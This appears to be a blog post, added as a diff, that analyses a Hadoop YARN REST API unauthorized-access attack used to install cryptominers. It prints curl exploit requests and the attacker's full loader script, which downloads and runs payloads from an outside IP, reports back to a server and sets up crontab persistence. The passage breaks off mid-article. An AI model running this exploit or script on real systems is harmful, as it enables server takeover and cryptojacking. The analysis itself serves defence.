@@ -1,0 +1,494 @@
+
+<!DOCTYPE html>
+<html lang="">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="挖矿病毒,Linux入侵,Miner,Hadoop Yarn REST API 未授权漏洞,Intrusion Analysis,">
+  
+
+  
+    <meta name="description" content="Fooying&#39;s Blog">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/footer-logo.png">
+  
+  <title>Hadoop Yarn REST API 未授权漏洞利用挖矿分析 [ Fooying ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Fooying</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/" class="pure-menu-link">首页</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="post" class="pure-menu-link">文章</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories" style="color:#202020;" class="pure-menu-link">分类</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/archives" style="color:#202020;" class="pure-menu-link">归档</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/tags" style="color:#202020;" class="pure-menu-link">标签</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/paper" class="pure-menu-link">Papers</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/project" class="pure-menu-link">项目</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/activity" class="pure-menu-link">动态</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/search" class="pure-menu-link">搜索</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Hadoop Yarn REST API 未授权漏洞利用挖矿分析
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2018-05-31T16:08:08.000Z">
+        2018-06-01
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hadoop-Yarn-REST-API-未授权漏洞/">Hadoop Yarn REST API 未授权漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Intrusion-Analysis/">Intrusion Analysis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux入侵/">Linux入侵</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Miner/">Miner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/挖矿病毒/">挖矿病毒</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+      <span class="read">阅读耗时 21 分钟</span>
+    </header>
+
+    <div class="post-content">
+      <h4 id="一-背景"><a class="markdownIt-Anchor" href="#一-背景"></a> 一、 背景</h4>
+<p>5月5日腾讯云安全团队曾针对攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行攻击，攻击者可以在未授权的情况下远程执行代码的安全问题进行预警，在预警的前后我们曾多次捕获相关的攻击案例，其中就包含利用该问题进行挖矿，我们针对其中一个案例进行分析并提供响应的安全建议和解决方案。</p>
+<a id="more"></a>
+<h4 id="二-漏洞说明"><a class="markdownIt-Anchor" href="#二-漏洞说明"></a> 二、 漏洞说明</h4>
+<p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。简单的说，用户可以向YARN提交特定应用程序进行执行，其中就允许执行相关包含系统命令。</p>
+<p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。</p>
+<p><em>攻击步骤：</em></p>
+<ol>
+<li>申请新的application</li>
+</ol>
+<p>直接通过curl进行POST请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X POST &apos;http://ip:8088/ws/v1/cluster/apps/new-application&apos;</span><br></pre></td></tr></table></figure>
+<p>返回内容类似于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,&quot;maximum-resource-capability&quot;:&#123;&quot;memory&quot;:16384,&quot;vCores&quot;:8&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>构造提交任务</li>
+</ol>
+<p>构造json文件1.json，内容如下，其中application-id对应上面得到的id，命令内容为尝试在<code>/var/tmp</code>目录下创建<code>11112222_test_111122222</code>文件，内容也为<code>111</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;am-container-spec&quot;:&#123;</span><br><span class="line">        &quot;commands&quot;:&#123;</span><br><span class="line">            &quot;command&quot;:&quot;echo &apos;111&apos; &gt; /var/tmp/11112222_test_11112222&quot;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,</span><br><span class="line">    &quot;application-name&quot;:&quot;test&quot;,</span><br><span class="line">    &quot;application-type&quot;:&quot;YARN&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -i -X POST -H &apos;Accept: application/json&apos; -H &apos;Content-Type: application/json&apos; http://ip:8088/ws/v1/cluster/apps --data-binary @1.json</span><br></pre></td></tr></table></figure>
+<p>即可完成攻击，命令被执行，在相应目录下可以看到生成了对应文件</p>
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/3bbdb209-d7cb-4393-aef3-516d056708b4.png">
+<p>更多漏洞详情可以参考 <a href="http://bbs.qcloud.com/thread-50090-1-1.html" target="_blank" rel="noopener">http://bbs.qcloud.com/thread-50090-1-1.html</a></p>
+<h4 id="三-入侵分析"><a class="markdownIt-Anchor" href="#三-入侵分析"></a> 三、入侵分析</h4>
+<p>在本次分析的案例中，受害机器部署有Hadoop YARN，并且存在未授权访问的安全问题，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的。</p>
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/be6e17a9-48b8-45ff-8a48-c6394823a1c7.png">
+<p>整个利用过程相对比较简单，通过捕捉Hadoop 的<code>launch_container.sh</code>执行脚本，我们可以看到其中一个案例中相关任务执行的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">export LOCAL_DIRS=&quot;/root/hadoop/tmp/nm-local-dir/usercache/dr.who/appcache/application_1527144634877_20417&quot;</span><br><span class="line">export APPLICATION_WEB_PROXY_BASE=&quot;/proxy/application_1527144634877_20417&quot;</span><br><span class="line">...这里省略部分内容</span><br><span class="line">export CONTAINER_ID=&quot;container_1527144634877_20417_02_000001&quot;</span><br><span class="line">export MALLOC_ARENA_MAX=&quot;4&quot;</span><br><span class="line">exec /bin/bash -c &quot;curl 185.222.210.59/x_wcr.sh | sh &amp; disown&quot;</span><br><span class="line">hadoop_shell_errorcode=$?</span><br><span class="line">if [ $hadoop_shell_errorcode -ne 0 ]</span><br><span class="line">then</span><br><span class="line">  exit $hadoop_shell_errorcode</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>可以很明显的看到第8行位置，从<code>185.222.210.59</code>下载并执行了一个名为<code>x_wcr.sh</code>的脚本。</p>
+<p>在实际过程中，我们从多个案例捕获了多个比如名为<code>cr.sh</code>的不同脚本，但实际的功能代码都差不多，我们对其中一个<code>x_wcr.sh</code>脚本进行分析，代码自上而下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pkill -f cryptonight</span><br><span class="line">pkill -f sustes</span><br><span class="line">pkill -f xmrig</span><br><span class="line">pkill -f xmr-stak</span><br><span class="line">pkill -f suppoie</span><br><span class="line">ps ax | grep &quot;config.json -t&quot; | grep -v grep | awk &apos;&#123;print $1&#125;&apos; | xargs kill -9</span><br><span class="line">ps ax | grep &apos;wc.conf\|wq.conf\|wm.conf\|wt.conf&apos; | grep -v grep | grep &apos;ppl\|pscf\|ppc\|ppp&apos; | awk &apos;&#123;print $1&#125;&apos; | xargs kill -9</span><br><span class="line">rm -rf /var/tmp/pscf*</span><br><span class="line">rm -rf /tmp/pscf*</span><br></pre></td></tr></table></figure>
+<p>这部分代码主要针对已存在的挖矿进程、文件进行清理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">DIR=&quot;/tmp&quot;</span><br><span class="line">if [ -a &quot;/tmp/java&quot; ]</span><br><span class="line">then</span><br><span class="line">    if [ -w &quot;/tmp/java&quot; ] &amp;&amp; [ ! -d &quot;/tmp/java&quot; ]</span><br><span class="line">    then</span><br><span class="line">        if [ -x &quot;$(command -v md5sum)&quot; ]</span><br><span class="line">        then</span><br><span class="line">            sum=$(md5sum /tmp/java | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">            echo $sum</span><br><span class="line">            case $sum in</span><br><span class="line">                183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)</span><br><span class="line">                    echo &quot;Java OK&quot;</span><br><span class="line">                ;;</span><br><span class="line">                *)</span><br><span class="line">                    echo &quot;Java wrong&quot;</span><br><span class="line">                    pkill -f w.conf</span><br><span class="line">                    sleep 4</span><br><span class="line">                ;;</span><br><span class="line">            esac</span><br><span class="line">        fi</span><br><span class="line">        echo &quot;P OK&quot;</span><br><span class="line">    else</span><br><span class="line">        DIR=$(mktemp -d)/tmp</span><br><span class="line">        mkdir $DIR</span><br><span class="line">        echo &quot;T DIR $DIR&quot;</span><br><span class="line">    fi</span><br><span class="line">else</span><br><span class="line">    if [ -d &quot;/var/tmp&quot; ]</span><br><span class="line">    then</span><br><span class="line">        DIR=&quot;/var/tmp&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo &quot;P NOT EXISTS&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>这部分的代码主要是判断如果<code>/tmp/java</code>是一个存在并且可写的文件，那么就判断其MD5值是否匹配，MD5不匹配则根据<code>w.conf</code>关键词查找并kill进程；如果非可写的文件，则重新赋值DIR变量，这个变量主要用于后面部分代码中下载挖矿等程序存放目录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if [ -d &quot;/tmp/java&quot; ]</span><br><span class="line">then</span><br><span class="line">    DIR=$(mktemp -d)/tmp</span><br><span class="line">    mkdir $DIR</span><br><span class="line">    echo &quot;T DIR $DIR&quot;</span><br><span class="line">fi</span><br><span class="line">WGET=&quot;wget -O&quot;</span><br><span class="line">if [ -s /usr/bin/curl ];</span><br><span class="line">then</span><br><span class="line">    WGET=&quot;curl -o&quot;;</span><br><span class="line">fi</span><br><span class="line">if [ -s /usr/bin/wget ];</span><br><span class="line">then</span><br><span class="line">    WGET=&quot;wget -O&quot;;</span><br><span class="line">fi</span><br><span class="line">f2=&quot;185.222.210.59&quot;</span><br></pre></td></tr></table></figure>
+<p>然后接着是一些变量的赋值，包括再次判断如果<code>/tmp/java</code>是一个目录，则重新赋值DIR变量；判断curl和wget命令是否存在，存在则赋值到WGET变量；<code>f2</code>则是赋值为某个IP，实则为是后续下载相关文件的服务器之一。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if [ ! &quot;$(ps -fe|grep &apos;/tmp/java&apos;|grep &apos;w.conf&apos;|grep -v grep)&quot; ];</span><br><span class="line">then</span><br><span class="line">    downloadIfNeed</span><br><span class="line">    chmod +x $DIR/java</span><br><span class="line">    $WGET $DIR/w.conf http://$f2/w.conf</span><br><span class="line">    nohup $DIR/java -c $DIR/w.conf &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">    sleep 5</span><br><span class="line">    rm -rf $DIR/w.conf</span><br><span class="line">else</span><br><span class="line">    echo &quot;Running&quot;</span><br><span class="line">fi</span><br><span class="line">if crontab -l | grep -q &quot;185.222.210.59&quot;</span><br><span class="line">then</span><br><span class="line">    echo &quot;Cron exists&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;Cron not found&quot;</span><br><span class="line">    LDR=&quot;wget -q -O -&quot;</span><br><span class="line">    if [ -s /usr/bin/curl ];</span><br><span class="line">    then</span><br><span class="line">        LDR=&quot;curl&quot;;</span><br><span class="line">    fi</span><br><span class="line">    if [ -s /usr/bin/wget ];</span><br><span class="line">    then</span><br><span class="line">        LDR=&quot;wget -q -O -&quot;;</span><br><span class="line">    fi</span><br><span class="line">    (crontab -l 2&gt;/dev/null; echo &quot;* * * * * $LDR http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1&quot;)| crontab -</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>这部分代码是其中比较核心的代码，通过<code>downloadIfNeed</code>方法下载挖矿程序到<code>$DIR</code>目录下并重命名为<code>java</code>，下载<code>w.conf</code>配置文件，给挖矿程序增加执行权限，然后以<code>nohup</code>命令后台运行挖矿程序并删除配置文件；接着检查crontab中的任务，如果不存在对应的任务，就将下载执行脚本的任务<code>* * * * * $LDR http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1</code>添加到其中,这里<code>$LDR</code>为<code>wget -q -O -</code>或者<code>curl</code>，任务每分钟执行一次。</p>
+<p>脚本中还包含了几个嵌套调用的<code>download</code>方法，入口方法是<code>downloadIfNeed</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">downloadIfNeed()</span><br><span class="line">&#123;</span><br><span class="line">    if [ -x &quot;$(command -v md5sum)&quot; ]</span><br><span class="line">    then</span><br><span class="line">        if [ ! -f $DIR/java ]; then</span><br><span class="line">            echo &quot;File not found!&quot;</span><br><span class="line">            download</span><br><span class="line">        fi</span><br><span class="line">        sum=$(md5sum $DIR/java | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">        echo $sum</span><br><span class="line">        case $sum in</span><br><span class="line">            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)</span><br><span class="line">                echo &quot;Java OK&quot;</span><br><span class="line">            ;;</span><br><span class="line">            *)</span><br><span class="line">                echo &quot;Java wrong&quot;</span><br><span class="line">                sizeBefore=$(du $DIR/java)</span><br><span class="line">                if [ -s /usr/bin/curl ];</span><br><span class="line">                then</span><br><span class="line">                    WGET=&quot;curl -k -o &quot;;</span><br><span class="line">                fi</span><br><span class="line">                if [ -s /usr/bin/wget ];</span><br><span class="line">                then</span><br><span class="line">                    WGET=&quot;wget --no-check-certificate -O &quot;;</span><br><span class="line">                fi</span><br><span class="line">                echo &quot;&quot; &gt; $DIR/tmp.txt</span><br><span class="line">                rm -rf $DIR/java</span><br><span class="line">                download</span><br><span class="line"></span><br><span class="line">                if [ -x &quot;$(command -v md5sum)&quot; ]</span><br><span class="line">                then</span><br><span class="line">                    sum=$(md5sum $DIR/java | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">                    echo $sum</span><br><span class="line">                    case $sum in</span><br><span class="line">                        183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)</span><br><span class="line">                            echo &quot;Java OK&quot;</span><br><span class="line">                            cp $DIR/java $DIR/ppc</span><br><span class="line">                        ;;</span><br><span class="line">                        *)</span><br><span class="line">                            $WGET $DIR/java https://transfer.sh/WoGXx/zzz &gt; $DIR/tmp.txt 2&gt;&amp;1</span><br><span class="line">                            echo &quot;Java wrong&quot;</span><br><span class="line">                            sum=$(md5sum $DIR/java | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">                            case $sum in</span><br><span class="line">                                183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)</span><br><span class="line">                                    echo &quot;Java OK&quot;</span><br><span class="line">                                    cp $DIR/java $DIR/ppc</span><br><span class="line">                                ;;</span><br><span class="line">                                *)</span><br><span class="line">                                    echo &quot;Java wrong2&quot;</span><br><span class="line">                                ;;</span><br><span class="line">                            esac</span><br><span class="line">                        ;;</span><br><span class="line">                    esac</span><br><span class="line">                else</span><br><span class="line">                    echo &quot;No md5sum&quot;</span><br><span class="line">                fi</span><br><span class="line"></span><br><span class="line">                sumAfter=$(md5sum $DIR/java | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">                if [ -s /usr/bin/curl ];</span><br><span class="line">                then</span><br><span class="line">                    echo &quot;redownloaded $sum $sizeBefore after $sumAfter &quot; `du $DIR/java` &gt;&gt; $DIR/tmp.txt</span><br><span class="line">                    curl -F &quot;file=@$DIR/tmp.txt&quot; http://$f2/re.php</span><br><span class="line">                fi</span><br><span class="line">            ;;</span><br><span class="line">        esac</span><br><span class="line">    else</span><br><span class="line">        echo &quot;No md5sum&quot;</span><br><span class="line">        download</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法的核心功能还是校验已存在的挖矿程序的MD5，如果无法验证或者文件不存在的情况，则直接调用<code>download</code>方法下载挖矿程序；如果文件存在但MD5匹配不正确，则调用<code>download</code>方法后再次验证，验证失败则尝试从另外一个下载渠道<code>https://transfer.sh/WoGXx/zzz</code>下载挖矿程序并再次验证。最后还将相关结果上报到目标服务器<code>$f2</code>的<code>re.php</code>.</p>
+<p>tmp.txt内容示例：</p>
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/f224a66c-d2c2-417a-8481-1ea7dbc7bad7.png">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">download() &#123;</span><br><span class="line">    if [ -x &quot;$(command -v md5sum)&quot; ]</span><br><span class="line">    then</span><br><span class="line">        sum=$(md5sum $DIR/ppc | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">        echo $sum</span><br><span class="line">        case $sum in</span><br><span class="line">            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)</span><br><span class="line">                echo &quot;Java OK&quot;</span><br><span class="line">                cp $DIR/ppc $DIR/java</span><br><span class="line">            ;;</span><br><span class="line">            *)</span><br><span class="line">                echo &quot;Java wrong&quot;</span><br><span class="line">                download2</span><br><span class="line">            ;;</span><br><span class="line">        esac</span><br><span class="line">    else</span><br><span class="line">        echo &quot;No md5sum&quot;</span><br><span class="line">        download2</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>download</code>方法判断ppc文件的存在与否和 MD5是否匹配，如果不存在或MD5不匹配则调用<code>download2</code>下载，如果存在则复制重名为<code>java</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">download2() &#123;</span><br><span class="line">    f1=$(curl 185.222.210.59/g.php)</span><br><span class="line">    if [ -z &quot;$f1&quot; ];</span><br><span class="line">    then</span><br><span class="line">        f1=$(wget -q -O - 185.222.210.59/g.php)</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    if [ `getconf LONG_BIT` = &quot;64&quot; ]</span><br><span class="line">    then</span><br><span class="line">        $WGET $DIR/java http://$f1/xm64?$RANDOM</span><br><span class="line">    else</span><br><span class="line">        $WGET $DIR/java http://$f1/xm32?$RANDOM</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    if [ -x &quot;$(command -v md5sum)&quot; ]</span><br><span class="line">    then</span><br><span class="line">        sum=$(md5sum $DIR/java | awk &apos;&#123; print $1 &#125;&apos;)</span><br><span class="line">        echo $sum</span><br><span class="line">        case $sum in</span><br><span class="line">            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)</span><br><span class="line">                echo &quot;Java OK&quot;</span><br><span class="line">                cp $DIR/java $DIR/ppc</span><br><span class="line">            ;;</span><br><span class="line">            *)</span><br><span class="line">                echo &quot;Java wrong&quot;</span><br><span class="line">            ;;</span><br><span class="line">        esac</span><br><span class="line">    else</span><br><span class="line">        echo &quot;No md5sum&quot;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>download2</code>方法则判断系统下载对应版本的挖矿程序，其中<code>http://185.222.210.59/g.php</code>返回的是另外一个IP地址；下载成功后则再次验证，并复制重命名为<code>ppc</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pkill -f logo4.jpg</span><br><span class="line">pkill -f logo0.jpg</span><br><span class="line">pkill -f logo9.jpg</span><br><span class="line">pkill -f jvs</span><br><span class="line">pkill -f javs</span><br><span class="line">pkill -f 192.99.142.248</span><br><span class="line">rm -rf /tmp/pscd*</span><br><span class="line">rm -rf /var/tmp/pscd*</span><br><span class="line">crontab -l | sed &apos;/192.99.142.232/d&apos; | crontab -</span><br><span class="line">crontab -l | sed &apos;/192.99.142.226/d&apos; | crontab -</span><br><span class="line">crontab -l | sed &apos;/192.99.142.248/d&apos; | crontab -</span><br><span class="line">crontab -l | sed &apos;/logo4/d&apos; | crontab -</span><br><span class="line">crontab -l | sed &apos;/logo9/d&apos; | crontab -</span><br><span class="line">crontab -l | sed &apos;/logo0/d&apos; | crontab -</span><br></pre></td></tr></table></figure>
+<p>在脚本的最后部分还有一些进程、文件、crontab清理的处理，用pkill删除满足条件的进程，删除tmp目录下pscd开头的文件，以及说删除crontab中存在某些关键词的任务。</p>
+<p>至此，我们完成整个脚本的分析，虽然整个脚本比较冗长，而且似乎各个函数嵌套调用，涉及文件也众多，但其实整体就做了以下几件事：</p>
+<ol>
+<li>清理相关的进程、文件和crontab任务</li>
+<li>判断并下载挖矿程序，同时校验MD5值，除了黑客自己控制的服务器，还利用<code>https://transfer.sh</code>提供备用下载，多种方式保障</li>
+<li>增加脚本下载执行任务添加到crontab里</li>
+</ol>
+<p>其实，我们通过查看YARN的日志文件<code>yarn-root-nodemanager-master.hadoop.log</code>也可能看到相应的痕迹：</p>
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/93602699-b14d-4e68-b9ec-4491ad08a0b6.png">
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/e81b0c8c-f961-4140-8bf4-523b2e89f70f.png">
+<p>或者我们通过管理UI查看application详情：</p>
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/3241d083-5db1-4c74-8446-055693f963a9.png">
+<p>而crontab的任务日志也能看到相关的执行记录：</p>
+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/4b0cc89c-6740-4979-ad43-6a93b4956e39.png">
+<p>最终在/var/tmp目录下也能找到相关的文件</p>
